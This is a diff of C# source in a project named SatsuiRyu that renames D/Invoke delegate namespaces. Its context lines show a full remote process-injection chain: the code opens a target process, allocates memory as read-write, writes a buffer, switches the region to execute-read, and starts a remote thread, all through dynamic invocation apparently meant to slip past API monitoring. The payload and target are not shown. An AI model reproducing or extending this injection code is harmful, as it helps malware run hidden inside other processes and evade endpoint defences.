@@ -72,7 +72,7 @@ namespace SatsuiRyu
                 oa,
                 ci
             };
-            status = ntdll.ChaseFunction("NtOpenProcess", typeof(DynamicInvoke.Native.DELEGATES.NtOpenProcess), ntOpenProcessArgs);
+            status = ntdll.ChaseFunction("NtOpenProcess", typeof(DInvoke.DynamicInvoke.Native.DELEGATES.NtOpenProcess), ntOpenProcessArgs);
             pHandle = (IntPtr)ntOpenProcessArgs[0];
 
             ntdll.CheckNullPtr(pHandle, "[-] Failed to get process handle");
@@ -88,7 +88,7 @@ namespace SatsuiRyu
                 (uint)0x04
             };
             status = ntdll.ChaseFunction("NtAllocateVirtualMemory",
-                                         typeof(DynamicInvoke.Native.DELEGATES.NtAllocateVirtualMemory),
+                                         typeof(DInvoke.DynamicInvoke.Native.DELEGATES.NtAllocateVirtualMemory),
                                          allocateVirtualMemoryParams);
 
             memAlloc = (IntPtr)allocateVirtualMemoryParams[1];
@@ -106,7 +106,7 @@ namespace SatsuiRyu
                 bytesWritten
             };
             status = ntdll.ChaseFunction("NtWriteVirtualMemory",
-                                         typeof(DynamicInvoke.Native.DELEGATES.NtWriteVirtualMemory),
+                                         typeof(DInvoke.DynamicInvoke.Native.DELEGATES.NtWriteVirtualMemory),
                                          writeVirtualMemoryParams);
 
             bytesWritten = (uint)writeVirtualMemoryParams[4];
@@ -114,7 +114,7 @@ namespace SatsuiRyu
             // NtProtectVirtualMemory
             object[] protectVirtualMemoryParams = { pHandle, memAlloc, size, (uint)0x20, oldProtect };
             status = ntdll.ChaseFunction("NtProtectVirtualMemory",
-                                         typeof(DynamicInvoke.Native.DELEGATES.NtProtectVirtualMemory),
+                                         typeof(DInvoke.DynamicInvoke.Native.DELEGATES.NtProtectVirtualMemory),
                                          protectVirtualMemoryParams);
 
 
@@ -138,7 +138,7 @@ namespace SatsuiRyu
                 IntPtr.Zero
             };
             status = ntdll.ChaseFunction("NtCreateThreadEx",
-                                         typeof(DynamicInvoke.Native.DELEGATES.NtCreateThreadEx),
+                                         typeof(DInvoke.DynamicInvoke.Native.DELEGATES.NtCreateThreadEx),
                                          createThreadParams);
             pThread = (IntPtr)createThreadParams[0];
             ntdll.CheckNullPtr(pThread, "[-] Failed to start thread");
